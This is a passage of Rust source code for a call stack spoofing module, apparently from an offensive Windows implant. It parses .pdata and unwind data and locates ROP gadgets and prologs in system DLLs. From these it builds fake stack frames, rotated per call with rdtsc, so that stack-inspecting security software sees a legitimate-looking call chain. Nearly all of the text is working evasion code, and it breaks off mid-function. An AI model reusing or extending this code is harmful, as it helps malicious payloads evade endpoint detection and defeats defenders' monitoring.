//! Synthetic stack frame construction for UWD call stack spoofing.
//!
//! This module handles everything needed to build fake call stacks that
//! fool Windows' stack unwinder (`RtlVirtualUnwind`):
//!
//! 1. **Parse .pdata**    - Find `RUNTIME_FUNCTION` entries for a module
//! 2. **Get frame sizes** - Walk `UNWIND_INFO`/`UNWIND_CODE` to calculate stack sizes
//! 3. **Find gadgets**    - Locate `jmp [rbx]` and `add rsp, X; ret` in legit modules
//! 4. **Find prologs**    - Locate SET_FPREG and push-RBP functions for synthetic frames
//! 5. **Rotate frames**   - Per-call rotation using `rdtsc` entropy
//! 6. **Build config**    - Orchestrate all steps into a `Config` for the ASM stub
//!
//! # How the stack unwinder works
//!
//! Windows uses the `.pdata` section to unwind call stacks. Each function has a
//! `RUNTIME_FUNCTION` entry describing its stack frame layout. We read these same
//! entries to construct synthetic frames with correct sizes, making the unwinder
//! believe the call chain is legitimate.
//!
//! ```text
//! UWD-spoofed stack (what Software sees):
//!
//!    RSP ──► ┌──────────────────────────┐
//!            │  kernelbase!FuncA        │ ← Software: "looks normal"
//!            ├──────────────────────────┤
//!            │  kernel32!FuncB          │
//!            ├──────────────────────────┤
//!            │  kernel32!BaseThunk      │
//!            ├──────────────────────────┤
//!            │  ntdll!RtlUserStart      │ ← Standard thread root
//!            └──────────────────────────┘
//! ```
//!
//! # References
//!
//! - Microsoft x64 exception handling: https://learn.microsoft.com/en-us/cpp/build/exception-handling-x64
//! - SilentMoonwalk: https://github.com/klezVirus/SilentMoonwalk
//! - UWD POC: poc/uwd/src/uwd.rs

use {
    super::types::*,
    core::ffi::c_void,
    ntdef::windows::{
        IMAGE_DIRECTORY_ENTRY_EXCEPTION, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS,
        IMAGE_NT_SIGNATURE, IMAGE_RUNTIME_FUNCTION_ENTRY,
    },
};

/// Find the first occurrence of `needle` in `haystack` (byte-level substring search).
#[link_section = ".text$E"]
fn memmem(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    let h_len = haystack.len();
    let n_len = needle.len();
    if n_len == 0 || n_len > h_len {
        return None;
    }

    let h_ptr = haystack.as_ptr();
    let n_ptr = needle.as_ptr();

    let mut i = 0usize;
    while i <= h_len - n_len {
        let mut j = 0usize;
        while j < n_len {
            if unsafe { *h_ptr.add(i + j) != *n_ptr.add(j) } {
                break;
            }
            j += 1;
        }
        if j == n_len {
            return Some(i);
        }
        i += 1;
    }

    None
}
// =============================================================================
// Step 1: Parse .pdata section
// =============================================================================

/// Locates the `.pdata` (Exception Directory) section in a PE module.
///
/// The `.pdata` section contains an array of `RUNTIME_FUNCTION` entries - one
/// per function in the module. Each entry maps a function's address range to
/// its `UNWIND_INFO`, which describes how the stack unwinder should process it.
///
/// # How it works
///
/// ```text
/// PE Header
///  └─► OptionalHeader
///       └─► DataDirectory[3]          ← IMAGE_DIRECTORY_ENTRY_EXCEPTION
///            ├─ VirtualAddress ───────► Start of RUNTIME_FUNCTION array
///            └─ Size ─────────────────► Total bytes / 12 = number of entries
/// ```
///
/// # Arguments
///
/// * `module_base` - Base address of a loaded PE module (e.g., ntdll.dll)
///
/// # Returns
///
/// * `Some((ptr, count))` - Pointer to the RUNTIME_FUNCTION array and entry count
/// * `None` - If PE validation fails or no .pdata section exists
///
/// # Safety
///
/// `module_base` must point to a valid, loaded PE image in memory.
#[link_section = ".text$E"]
pub unsafe fn find_pdata(
    module_base: *mut u8,
) -> Option<(*const IMAGE_RUNTIME_FUNCTION_ENTRY, usize)> {
    // Validate DOS header (every PE starts with "MZ")
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return None;
    }

    // Validate NT headers (e_lfanew points from DOS header to "PE\0\0")
    let nt_header =
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS;
    if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
        return None;
    }

    // Read the Exception Directory entry (index 3 in DataDirectory)
    // This points to the .pdata section containing RUNTIME_FUNCTION entries
    let data_dir = (*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

    if data_dir.VirtualAddress == 0 || data_dir.Size == 0 {
        return None;
    }

    // Calculate pointer to the RUNTIME_FUNCTION array and number of entries
    // Each RUNTIME_FUNCTION is 12 bytes: BeginAddress(4) + EndAddress(4) + UnwindInfoAddress(4)
    let address = (module_base as usize + data_dir.VirtualAddress as usize)
        as *mut IMAGE_RUNTIME_FUNCTION_ENTRY;
    let length = data_dir.Size as usize / core::mem::size_of::<IMAGE_RUNTIME_FUNCTION_ENTRY>();

    Some((address, length))
}

// =============================================================================
// Step 2: Parse UNWIND_INFO to get frame sizes
// =============================================================================

/// Calculates the total stack frame size of a function by parsing its UNWIND_INFO.
///
/// This is the core of UWD. The stack unwinder uses this same data to walk the
/// call stack, so getting the exact frame size is critical for building synthetic
/// frames that pass validation.
///
/// # How it works
///
/// Each function's prologue modifies RSP in specific ways. The UNWIND_INFO records
/// every modification as an UNWIND_CODE entry. We walk all entries and sum up the
/// total stack space allocated:
///
/// ```text
/// Example function prologue:        UNWIND_CODE:              Stack change:
/// ─────────────────────────         ──────────────            ─────────────
/// push rbp                          UWOP_PUSH_NONVOL(RBP)    +8  bytes
/// push rsi                          UWOP_PUSH_NONVOL(RSI)    +8  bytes
/// push rdi                          UWOP_PUSH_NONVOL(RDI)    +8  bytes
/// sub rsp, 0x20                     UWOP_ALLOC_SMALL(3)      +32 bytes  (OpInfo+1)*8
///                                                            ───────────
///                                                   Total:    56 bytes (0x38)
/// ```
///
/// # Multi-slot opcodes
///
/// Some opcodes are too large to fit in a single 2-byte UNWIND_CODE slot:
///
/// ```text
/// UWOP_ALLOC_LARGE (OpInfo=0): size in next slot * 8      → consumes 2 slots
/// UWOP_ALLOC_LARGE (OpInfo=1): full 32-bit size in next 2 → consumes 3 slots
/// UWOP_SAVE_NONVOL:           offset in next slot          → consumes 2 slots
/// UWOP_SAVE_NONVOL_BIG:      32-bit offset in next 2      → consumes 3 slots
/// UWOP_SAVE_XMM128:          offset in next slot           → consumes 2 slots
/// UWOP_SAVE_XMM128BIG:       32-bit offset in next 2      → consumes 3 slots
/// ```
///
/// # Chained unwind info
///
/// When `UNW_FLAG_CHAININFO` is set in the flags, the function's unwind info is
/// split across multiple RUNTIME_FUNCTION entries. A chained RUNTIME_FUNCTION
/// follows the UNWIND_CODE array, and its frame size is added recursively:
///
/// ```text
/// UNWIND_INFO (flags: CHAININFO)
///  ├─ UnwindCode[0..n]           ← partial frame size
///  └─ RUNTIME_FUNCTION (chained) ← points to another UNWIND_INFO
///      └─ UnwindCode[0..m]       ← remaining frame size
///                        Total = partial + remaining
/// ```
///
/// # Arguments
///
/// * `module_base` - Base address of the PE module (used to resolve RVAs)
/// * `runtime_func` - The RUNTIME_FUNCTION entry to parse
///
/// # Returns
///
/// * `Some(size)` - Total stack frame size in bytes
/// * `None` - If an unknown opcode is encountered
///
/// # Safety
///
/// `module_base` must point to a valid PE, and `runtime_func` must be a valid
/// entry from that module's .pdata section.
#[link_section = ".text$E"]
pub unsafe fn get_frame_size(
    module_base: usize,
    runtime_func: &IMAGE_RUNTIME_FUNCTION_ENTRY,
) -> Option<u32> {
    // Follow the UnwindInfoAddress RVA to the UNWIND_INFO header
    let unwind_info = (module_base + runtime_func.UnwindInfoAddress as usize) as *const UNWIND_INFO;

    // Get pointer to the UNWIND_CODE array (immediately after the 4-byte header)
    let codes = (*unwind_info).codes();

    let mut i = 0usize;
    let mut total_stack = 0u32;

    // Walk each UNWIND_CODE entry and accumulate stack allocations
    while i < (*unwind_info).CountOfCodes as usize {
        let code = &(*codes.add(i)).Anonymous;
        let op_info = code.OpInfo() as usize;

        match UNWIND_OP_CODES::try_from(code.UnwindOp()) {
            // push <reg> - each register push adds 8 bytes to the frame
            Ok(UNWIND_OP_CODES::UWOP_PUSH_NONVOL) => {
                total_stack += 8;
                i += 1;
            }

            // sub rsp, <small> - OpInfo encodes size as (OpInfo + 1) * 8
            // Range: 8 to 128 bytes (OpInfo 0-15)
            Ok(UNWIND_OP_CODES::UWOP_ALLOC_SMALL) => {
                total_stack += ((op_info + 1) * 8) as u32;
                i += 1;
            }

            // sub rsp, <large> - size stored in following slot(s)
            Ok(UNWIND_OP_CODES::UWOP_ALLOC_LARGE) => {
                if code.OpInfo() == 0 {
                    // 16-bit size in next slot, multiplied by 8
                    total_stack += (*codes.add(i + 1)).FrameOffset as u32 * 8;
                    i += 2;
                } else {
                    // Full 32-bit size in next two slots (not multiplied)
                    total_stack += *(codes.add(i + 1) as *const u32);
                    i += 3;
                }
            }

            // lea rbp, [rsp+offset] - sets frame pointer, no stack allocation
            Ok(UNWIND_OP_CODES::UWOP_SET_FPREG) => i += 1,

            // mov [rsp+off], <reg> - saves register, no stack change (1 extra slot for offset)
            Ok(UNWIND_OP_CODES::UWOP_SAVE_NONVOL) => i += 2,

            // Same as SAVE_NONVOL but with 32-bit offset (2 extra slots)
            Ok(UNWIND_OP_CODES::UWOP_SAVE_NONVOL_BIG) => i += 3,

            // movaps [rsp+off], xmm<N> - saves XMM register (1 extra slot)
            Ok(UNWIND_OP_CODES::UWOP_SAVE_XMM128) => i += 2,

            // Same as SAVE_XMM128 but with 32-bit offset (2 extra slots)
            Ok(UNWIND_OP_CODES::UWOP_SAVE_XMM128BIG) => i += 3,

            // Epilog / spare codes - informational only, skip
            Ok(UNWIND_OP_CODES::UWOP_EPILOG) | Ok(UNWIND_OP_CODES::UWOP_SPARE_CODE) => i += 1,

            // Machine frame (hardware interrupt/exception)
            // OpInfo=0: pushes 5 values (SS, RSP, RFLAGS, CS, RIP) = 0x40 bytes
            // OpInfo=1: same + error code = 0x48 bytes
            Ok(UNWIND_OP_CODES::UWOP_PUSH_MACH_FRAME) => {
                total_stack += if op_info == 0 { 0x40 } else { 0x48 };
                i += 1;
            }

            // Unknown opcode - can't determine frame size
            _ => return None,
        }
    }

    // Handle chained unwind info:
    // If UNW_FLAG_CHAININFO is set, another RUNTIME_FUNCTION sits after the
    // codes array. Its frame size adds to ours (the function's prologue was
    // split across multiple unwind entries).
    if ((*unwind_info).flags() & UNW_FLAG_CHAININFO) != 0 {
        total_stack += get_frame_size(module_base, &*(*unwind_info).chained_entry())?;
    }

    Some(total_stack)
}

// =============================================================================
// Step 3: Find ROP gadgets in legitimate modules
// =============================================================================

/// Result of a successful gadget search.
///
/// Contains the gadget's absolute address and the stack frame size of the
/// function it lives in. The frame size is needed so UWD can allocate the
/// correct amount of synthetic stack space for the unwinder to traverse.
///
/// ```text
/// kernelbase.dll
///  ├─ SomeFunction (frame_size = 0x58)
///  │   ├─ push rbp
///  │   ├─ sub rsp, 0x48
///  │   ├─ ...
///  │   ├─ add rsp, 0x58; ret    ← gadget found here!
///  │   └─ ...
///  └─ RUNTIME_FUNCTION → UNWIND_INFO → frame_size = 0x58
/// ```
pub struct GadgetResult {
    /// Absolute address of the gadget in memory.
    pub address: *const u8,
    /// Stack frame size of the function containing the gadget.
    pub frame_size: u32,
}

/// Searches for a byte pattern (gadget) within the executable code of a module.
///
/// This scans every function in the module's `.pdata` table, reading the raw
/// bytes between `BeginAddress` and `EndAddress` for each `RUNTIME_FUNCTION`
/// entry. If the pattern is found, the function's frame size is computed via
/// `get_frame_size` to ensure it's a valid, parseable function.
///
/// # Why restrict to RUNTIME_FUNCTION boundaries?
///
/// Gadgets found outside of known function boundaries are useless because:
/// 1. The unwinder can't find an UNWIND_INFO for them
/// 2. Without valid unwind data, `RtlVirtualUnwind` can't traverse the frame
/// 3. Software would flag the broken unwind chain
///
/// # What gadgets does UWD need?
///
/// ```text
/// Gadget 1: jmp [rbx]           (bytes: FF 23)
///   - Used to redirect execution through RBX register
///   - The ASM stub loads the target function address into [rbx]
///   - This gadget transfers control without a CALL (no return address pushed)
///
/// Gadget 2: add rsp, 0x58; ret  (bytes: 48 83 C4 58 C3)
///   - Cleans up a synthetic frame by adjusting RSP
///   - The `ret` pops the next synthetic return address
///   - The 0x58 must match the frame size of the function containing the gadget
///
/// Stack flow with gadgets:
///
///   RSP ──► ┌──────────────────────┐
///           │  jmp [rbx] gadget    │ ← redirects to target function
///           ├──────────────────────┤
///           │  (frame padding)     │ ← sized to match UNWIND_INFO
///           ├──────────────────────┤
///           │  add rsp, 0x58; ret  │ ← cleans up frame, chains to next
///           ├──────────────────────┤
///           │  (more frames...)    │
///           └──────────────────────┘
/// ```
///
/// # Arguments
///
/// * `module_base` - Base address of the PE module to scan
/// * `pattern` - Byte pattern to search for (e.g., `&[0xFF, 0x23]` for `jmp [rbx]`)
/// * `pdata` - Pointer to the module's RUNTIME_FUNCTION array
/// * `pdata_count` - Number of entries in the RUNTIME_FUNCTION array
///
/// # Returns
///
/// * `Some(GadgetResult)` - First valid gadget found with its frame size
/// * `None` - Pattern not found in any valid function
///
/// # Safety
///
/// `module_base` must be a valid loaded PE, and `pdata`/`pdata_count` must
/// describe a valid RUNTIME_FUNCTION array from that module.

// =============================================================================
// Step 3b: Find a function's RUNTIME_FUNCTION entry by RVA
// =============================================================================

/// Finds the RUNTIME_FUNCTION entry for a function at a given RVA.
///
/// The `.pdata` array is sorted by `BeginAddress` (Windows guarantees this),
/// so we use a linear scan checking if the RVA falls within each entry's
/// `[BeginAddress, EndAddress)` range.
///
/// # Why do we need this?
///
/// To populate the `Config` struct, we need the frame sizes of specific
/// functions like `RtlUserThreadStart` and `BaseThreadInitThunk`. We know
/// their absolute addresses (from API resolution), so we convert to RVA
/// and look up their RUNTIME_FUNCTION entry to parse their UNWIND_INFO.
///
/// ```text
/// RtlUserThreadStart address = ntdll_base + RVA
///                        RVA = address - ntdll_base
///
/// .pdata scan:
///   entry[0]: Begin=0x1000 End=0x1100  ← no
///   entry[1]: Begin=0x1100 End=0x1200  ← no
///   entry[N]: Begin=0xABC0 End=0xABF0  ← RVA falls here! ✓
/// ```
///
/// # Arguments
///
/// * `rva` - Relative Virtual Address of the function (address - module_base)
/// * `pdata` - Pointer to the module's RUNTIME_FUNCTION array
/// * `pdata_count` - Number of entries in the array
///
/// # Returns
///
/// Reference to the matching RUNTIME_FUNCTION entry, or `None` if not found.
#[link_section = ".text$E"]
pub unsafe fn find_runtime_entry(
    rva: u32,
    pdata: *const IMAGE_RUNTIME_FUNCTION_ENTRY,
    pdata_count: usize,
) -> Option<*const IMAGE_RUNTIME_FUNCTION_ENTRY> {
    let entries = core::slice::from_raw_parts(pdata, pdata_count);

    for entry in entries {
        if rva >= entry.BeginAddress && rva < entry.EndAddress {
            return Some(entry as *const _);
        }
    }

    None
}

/// Search for an `add rsp, N; ret` epilogue gadget whose immediate `N` equals the
/// containing function's own unwind frame size.
///
/// Unlike [`find_gadget`] with a hardcoded pattern, this guarantees the returned
/// `frame_size` matches what the gadget actually skips at runtime. Synthetic stack
/// layouts that space their fake return-address slots by `frame_size` (e.g. the
/// hypnus NtContinue chains) desync from execution when the immediate and the
/// frame size differ - the chain's `ret` instructions pop the wrong slots.
///
/// Both encodings are searched:
/// - `48 83 C4 <imm8>  C3` - `add rsp, imm8;  ret` (frame size <= 0x7F)
/// - `48 81 C4 <imm32> C3` - `add rsp, imm32; ret` (frame size >= 0x80)
#[link_section = ".text$E"]
pub unsafe fn find_self_sized_add_rsp_gadget(
    module_base: usize,
    pdata: *const IMAGE_RUNTIME_FUNCTION_ENTRY,
    pdata_count: usize,
) -> Option<GadgetResult> {
    let entries = core::slice::from_raw_parts(pdata, pdata_count);

    for entry in entries {
        // The gadget must skip exactly this function's unwind frame size,
        // otherwise the stack layout spacing and the runtime skip diverge.
        let frame_size = match get_frame_size(module_base, entry) {
            Some(size) if size > 0 => size,
            _ => continue,
        };

        let func_start = module_base + entry.BeginAddress as usize;
        let func_end = module_base + entry.EndAddress as usize;
        let func_size = func_end.saturating_sub(func_start);
        if func_size < 5 {
            continue;
        }

        let code = core::slice::from_raw_parts(func_start as *const u8, func_size);

        // Build the epilogue pattern for THIS function's frame size
        let mut pattern = [0u8; 8];
        let len = if frame_size <= 0x7F {
            pattern[0] = 0x48;
            pattern[1] = 0x83;
            pattern[2] = 0xC4;
            pattern[3] = frame_size as u8;
            pattern[4] = 0xC3;
            5
        } else {
            pattern[0] = 0x48;
            pattern[1] = 0x81;
            pattern[2] = 0xC4;
            pattern[3..7].copy_from_slice(&frame_size.to_le_bytes());
            pattern[7] = 0xC3;
            8
        };

        if let Some(offset) = memmem(code, &pattern[..len]) {
            return Some(GadgetResult {
                address: (func_start + offset) as *const u8,
                frame_size,
            });
        }
    }

    None
}

#[link_section = ".text$E"]
pub unsafe fn find_gadget(
    module_base: usize,
    pattern: &[u8],
    pdata: *const IMAGE_RUNTIME_FUNCTION_ENTRY,
    pdata_count: usize,
) -> Option<GadgetResult> {
    let entries = core::slice::from_raw_parts(pdata, pdata_count);

    for entry in entries {
        // Calculate the absolute address range of this function's code
        let func_start = module_base + entry.BeginAddress as usize;
        let func_end = module_base + entry.EndAddress as usize;
        let func_size = func_end.saturating_sub(func_start);

        if func_size < pattern.len() {
            continue;
        }

        // Read the function's raw code bytes
        let code = core::slice::from_raw_parts(func_start as *const u8, func_size);

        // Search for the pattern in this function's code
        if let Some(offset) = memmem(code, pattern) {
            // Verify the function has valid unwind data and get its frame size
            if let Some(frame_size) = get_frame_size(module_base, entry) {
                // Skip functions with zero frame size - they're leaf functions
                // and won't produce valid synthetic frames
                if frame_size == 0 {
                    continue;
                }

                let gadget_addr = (func_start + offset) as *const u8;
                return Some(GadgetResult {
                    address: gadget_addr,
                    frame_size,
                });
            }
        }
    }

    None
}

// =============================================================================
// Step 3c: Multi-result finders for per-call frame rotation
// =============================================================================

/// Searches for up to `POOL_SIZE` gadgets matching a byte pattern.
///
/// Same logic as `find_gadget` but collects multiple results into a
/// `FrameCandidate` array for per-call rotation. Stops after `POOL_SIZE`
/// candidates are found.
#[link_section = ".text$E"]
pub unsafe fn find_gadgets(
    module_base: usize,
    pattern: &[u8],
    pdata: *const IMAGE_RUNTIME_FUNCTION_ENTRY,
    pdata_count: usize,
    results: &mut [FrameCandidate; POOL_SIZE],
) -> usize {
    let entries = core::slice::from_raw_parts(pdata, pdata_count);
    let mut count = 0;

    // Scan every function in .pdata looking for the gadget byte pattern
    for entry in entries {
        if count >= POOL_SIZE {
            break; // Pool full - we have enough candidates
        }

        // Convert RVA range to absolute address range for this function
        let func_start = module_base + entry.BeginAddress as usize;
        let func_end = module_base + entry.EndAddress as usize;
        let func_size = func_end.saturating_sub(func_start);

        // Function too small to contain the gadget pattern
        if func_size < pattern.len() {
            continue;
        }

        // Read function body as byte slice and search for pattern
        let code = core::slice::from_raw_parts(func_start as *const u8, func_size);

        if let Some(offset) = memmem(code, pattern) {
            // Verify the function has valid UNWIND_INFO (required for unwinder traversal)
            if let Some(frame_size) = get_frame_size(module_base, entry) {
                // Skip leaf functions (zero frame) - unwinder can't traverse them
                if frame_size == 0 {
                    continue;
                }

                // Store absolute gadget address and its containing function's frame size
                results[count] = FrameCandidate {
                    addr: (func_start + offset) as *const c_void,
                    size: frame_size as u64,
                    rbp_offset: 0, // Gadgets don't use RBP offset
                };
                count += 1;
            }
        }
    }

    count
}

/// Finds up to `POOL_SIZE` SET_FPREG prologs suitable for the first synthetic frame.
///
/// Same logic as `find_prolog` but collects multiple results for rotation.
#[link_section = ".text$E"]
pub unsafe fn find_prologs(
    module_base: usize,
    pdata: *const IMAGE_RUNTIME_FUNCTION_ENTRY,
    pdata_count: usize,
    results: &mut [FrameCandidate; POOL_SIZE],
) -> usize {
    let entries = core::slice::from_raw_parts(pdata, pdata_count);
    let mut count = 0;

    // Scan every function in .pdata for SET_FPREG prologs
    for entry in entries {
        if count >= POOL_SIZE {
            break; // Pool full
        }

        // Check if this function has a SET_FPREG unwind code (uses RBP as frame pointer)
        if let Some((has_set_fpreg, stack_size)) = check_stack_frame(module_base, entry) {
            // Must have SET_FPREG (required for first frame) and non-zero stack
            if !has_set_fpreg || stack_size == 0 {
                continue;
            }

            // Find a `call [rip+disp32]` instruction to use as a plausible return address
            if let Some(offset) = find_valid_instruction_offset(module_base, entry) {
                // addr = instruction AFTER the call (where RIP would point on return)
                results[count] = FrameCandidate {
                    addr: (module_base + entry.BeginAddress as usize + offset as usize)
                        as *const c_void,
                    size: stack_size as u64,
                    rbp_offset: 0, // SET_FPREG frames don't track RBP push offset
                };
                count += 1;
            }
        }
    }

    count
}

/// Finds up to `POOL_SIZE` push-RBP prologs suitable for the second synthetic frame.
///
/// Same logic as `find_push_rbp_prolog` but collects multiple results for rotation.
#[link_section = ".text$E"]
pub unsafe fn find_push_rbp_prologs(
    module_base: usize,
    pdata: *const IMAGE_RUNTIME_FUNCTION_ENTRY,
    pdata_count: usize,
    results: &mut [FrameCandidate; POOL_SIZE],
) -> usize {
    let entries = core::slice::from_raw_parts(pdata, pdata_count);
    let mut count = 0;

    // Skip the first entry (often unsuitable across Windows versions, matches POC)
    for entry in entries.iter().skip(1) {
        if count >= POOL_SIZE {
            break; // Pool full
        }

        // Check if this function pushes/saves RBP, get the RBP stack offset
        if let Some((rbp_off, stack_size)) = check_rbp_frame(module_base, entry) {
            // Reject: no RBP offset, zero frame, or RBP offset past frame bounds
            if rbp_off == 0 || stack_size == 0 || stack_size <= rbp_off {
                continue;
            }

            // Find a `call [rip+disp32]` for the fake return address
            if let Some(offset) = find_valid_instruction_offset(module_base, entry) {
                // Store addr + frame size + RBP offset (ASM plants fake RBP at this offset)
                results[count] = FrameCandidate {
                    addr: (module_base + entry.BeginAddress as usize + offset as usize)
                        as *const c_void,
                    size: stack_size as u64,
                    rbp_offset: rbp_off as u64, // Offset where RBP is saved on stack
                };
                count += 1;
            }
        }
    }

    count
}

// =============================================================================
// Step 3d: Per-call frame rotation
// =============================================================================

/// Rotates different prolog candidates into Config before each spoofed call.
///
/// Uses `rdtsc` (Time Stamp Counter) as per-call entropy so each call
/// presents different intermediate frames to the unwinder.
///
/// Only prologs rotate (unwinder-only frames). Gadgets are fixed because
/// `add rsp, 0x58` must match the ASM-allocated frame size at runtime.
#[inline(always)]
#[link_section = ".text$E"]
pub unsafe fn rotate_config(config: &mut Config) {
    let fc = config.frame_pool.first_count;
    let sc = config.frame_pool.second_count;

    // Nothing to rotate if each pool has at most 1 candidate
    if fc <= 1 && sc <= 1 {
        return;
    }

    // Read CPU timestamp counter - changes every call, gives us per-call entropy
    let tsc = core::arch::x86_64::_rdtsc() as usize;

    // Rotate first frame (SET_FPREG prolog) using low bits of TSC
    if fc > 1 {
        let c = config.frame_pool.first_frames[tsc % fc as usize];
        config.first_frame_fp = c.addr;
        config.first_frame_size = c.size;
    }

    // Rotate second frame (push-RBP prolog) using different bits (>> 8)
    // to avoid correlation with first frame selection
    if sc > 1 {
        let c = config.frame_pool.second_frames[(tsc >> 8) % sc as usize];
        config.second_frame_fp = c.addr;
        config.second_frame_size = c.size;
        config.rbp_stack_offset = c.rbp_offset; // Where ASM plants fake RBP value
    }
}

// =============================================================================
// Step 4: Build synthetic stack frames
// =============================================================================
//
// To fool the unwinder, we need to find real functions in legitimate modules
// whose prologue layouts are suitable for spoofing. We need two kinds:
//
// 1. **First frame** ("normal" prologue):
//    A function that allocates stack space and contains a `call [rip+0]`
//    instruction. The call instruction gives us a valid "return address"
//    within the function that the unwinder can resolve.
//
// 2. **Second frame** (RBP-based prologue):
//    A function that pushes RBP (or saves it via MOV). This gives us a
//    frame with a known RBP offset, which the unwinder expects to see
//    in frame-pointer-based call chains.
//
// Together with the gadgets from Step 3 and the thread root functions
// (RtlUserThreadStart + BaseThreadInitThunk), these form the complete
// synthetic call stack:
//
// ```text
// Spoofed call stack (bottom to top):
//
//   ┌─────────────────────────────────┐
//   │  RtlUserThreadStart            │ ← thread root (every thread has this)
//   │  frame_size from UNWIND_INFO   │
//   ├─────────────────────────────────┤
//   │  BaseThreadInitThunk           │ ← standard second frame
//   │  frame_size from UNWIND_INFO   │
//   ├─────────────────────────────────┤
//   │  Second frame (push rbp)       │ ← from find_push_rbp_prolog()
//   │  valid call [rip+0] ret addr   │
//   ├─────────────────────────────────┤
//   │  First frame (normal)          │ ← from find_prolog()
//   │  valid call [rip+0] ret addr   │
//   ├─────────────────────────────────┤
//   │  add rsp, 0x58; ret gadget     │ ← stack cleanup
//   ├─────────────────────────────────┤
//   │  jmp [rbx] gadget              │ ← jumps to target function
//   └─────────────────────────────────┘
// ```

/// Metadata for a function prologue suitable for stack frame spoofing.
///
/// Found by scanning a module's `.pdata` for functions with compatible
/// prologue layouts and a valid instruction to use as a return address.
#[derive(Clone, Copy)]
pub struct Prolog {
    /// Absolute address of the function (module_base + BeginAddress).
    pub frame: usize,
    /// Total stack frame size from UNWIND_INFO.
    pub stack_size: u32,
    /// Offset within the function of a valid `call [rip+0]` instruction.
    /// Used as the fake return address: `frame + offset`.
    pub offset: u32,
    /// Offset in the stack where RBP is saved (only set for push-rbp frames).
    pub rbp_offset: u32,
}

/// Finds a `call qword ptr [rip+0]` instruction within a function.
///
/// This is used to find a plausible "return address" inside a legitimate
/// function. The unwinder will see this address and look it up in `.pdata`
/// to find the RUNTIME_FUNCTION - since it's a real instruction inside
/// a real function, the lookup succeeds and the unwind chain looks valid.
///
/// # The pattern
///
/// ```text
/// 48 FF 15 XX XX XX XX    call qword ptr [rip + disp32]
///                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~
///                         7 bytes total
///
/// We return offset + 7 (the address AFTER the call), because that's
/// where a return address would point (as if the function had been called).
/// ```
///
/// # Arguments
///
/// * `module_base` - Base address of the module
/// * `entry` - RUNTIME_FUNCTION entry for the function to scan
///
/// # Returns
///
/// Offset from `BeginAddress` to the instruction after the `call [rip+0]`.
#[link_section = ".text$E"]
pub unsafe fn find_valid_instruction_offset(
    module_base: usize,
    entry: &IMAGE_RUNTIME_FUNCTION_ENTRY,
) -> Option<u32> {
    let func_start = module_base + entry.BeginAddress as usize;
    let func_end = module_base + entry.EndAddress as usize;
    let func_size = func_end.saturating_sub(func_start);

    let code = core::slice::from_raw_parts(func_start as *const u8, func_size);

    // Search for `call qword ptr [rip+disp32]` - opcode prefix is 48 FF 15
    if let Some(pos) = memmem(code, &[0x48, 0xFF, 0x15]) {
        // Return offset AFTER the 7-byte instruction (where RIP would be on return)
        return Some((pos + 7) as u32);
    }

    None
}

/// Finds a function with a SET_FPREG prologue, suitable for the **first**
/// synthetic frame.
///
/// The first frame MUST use SET_FPREG because the ASM stub plants a fake RBP
/// value (via the second frame's rbp_offset). When the unwinder processes the
/// first frame, it reads the restored RBP and uses `RBP - FrameOffset*16` to
/// establish the frame. This is how the chain correctly reaches
/// BaseThreadInitThunk.
///
/// This matches the POC's `Prolog::find_prolog()` + `stack_frame()`.
#[link_section = ".text$E"]
pub unsafe fn find_prolog(
    module_base: usize,
    pdata: *const IMAGE_RUNTIME_FUNCTION_ENTRY,
    pdata_count: usize,
) -> Option<Prolog> {
    let entries = core::slice::from_raw_parts(pdata, pdata_count);

    for entry in entries {
        if let Some((has_set_fpreg, stack_size)) = check_stack_frame(module_base, entry) {
            // Must have SET_FPREG and non-zero stack
            if !has_set_fpreg || stack_size == 0 {
                continue;
            }

            // Must have a call [rip+0] instruction for the fake return address
            if let Some(offset) = find_valid_instruction_offset(module_base, entry) {
                return Some(Prolog {
                    frame: module_base + entry.BeginAddress as usize,
                    stack_size,
                    offset,
                    rbp_offset: 0,
                });
            }
        }
    }

    None
}

/// Checks if a function's prologue is suitable for the first frame.
///
/// Matches the POC's `stack_frame()` function. Returns `(set_fpreg_hit, total_stack)`:
/// - `set_fpreg_hit`: whether UWOP_SET_FPREG was encountered (required for first frame)
/// - `total_stack`: total stack size, with FrameOffset<<4 subtracted when SET_FPREG is hit
///
/// SET_FPREG is allowed (and required) because the ASM stub relies on the
/// unwinder using RBP to establish the frame for the first synthetic frame.
///
/// Rejects functions that:
/// - Push RSP (when no SET_FPREG seen yet)
/// - Have both EH handler AND chain info with SET_FPREG
/// - Use a frame register other than RBP with SET_FPREG
#[link_section = ".text$E"]
unsafe fn check_stack_frame(
    module_base: usize,
    entry: &IMAGE_RUNTIME_FUNCTION_ENTRY,
) -> Option<(bool, u32)> {
    let unwind_info = (module_base + entry.UnwindInfoAddress as usize) as *const UNWIND_INFO;
    let codes = (*unwind_info).codes();
    let flags = (*unwind_info).flags();

    let mut i = 0usize;
    let mut set_fpreg_hit = false;
    let mut total_stack = 0i32;

    while i < (*unwind_info).CountOfCodes as usize {
        let code = &(*codes.add(i)).Anonymous;
        let op_info = code.OpInfo() as usize;

        match UNWIND_OP_CODES::try_from(code.UnwindOp()) {
            Ok(UNWIND_OP_CODES::UWOP_PUSH_NONVOL) => {
                // Reject RSP push only if SET_FPREG hasn't been seen yet
                if Registers::Rsp == op_info && !set_fpreg_hit {
                    return None;
                }
                total_stack += 8;
                i += 1;
            }
            Ok(UNWIND_OP_CODES::UWOP_ALLOC_SMALL) => {
                total_stack += ((op_info + 1) * 8) as i32;
                i += 1;
            }
            Ok(UNWIND_OP_CODES::UWOP_ALLOC_LARGE) => {
                if code.OpInfo() == 0 {
                    total_stack += (*codes.add(i + 1)).FrameOffset as i32 * 8;
                    i += 2;
                } else {
                    total_stack += *(codes.add(i + 1) as *const i32);
                    i += 3;
                }
            }
            Ok(UNWIND_OP_CODES::UWOP_SET_FPREG) => {
                // Reject if both EH handler and chain info are set - ambiguous layout
                if (flags & UNW_FLAG_EHANDLER) != 0 && (flags & UNW_FLAG_CHAININFO) != 0 {
                    return None;
                }
                // Frame register must be RBP (our ASM only supports RBP-based frames)
                if (*unwind_info).frame_register() != Registers::Rbp as u8 {
